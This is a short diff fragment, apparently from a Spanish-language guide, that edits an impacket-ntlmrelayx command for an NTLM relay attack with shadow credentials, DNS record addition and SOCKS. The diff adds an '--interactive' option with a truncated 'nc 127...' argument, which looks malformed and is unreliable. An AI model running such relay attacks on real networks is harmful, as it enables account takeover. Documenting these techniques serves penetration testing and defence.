@@ -24,7 +24,8 @@ impacket-ntlmrelayx.py -tf targets.txt -smb2support \
   --shadow-credentials \
   --shadow-target objetivo$ \
   --add-dns-record \
-  --socks
+  --socks \
+  --interactive "nc 127..."
 ```
 
 - `-tf targets.txt`: Lista de objetivos (SMB, LDAP, etc.).
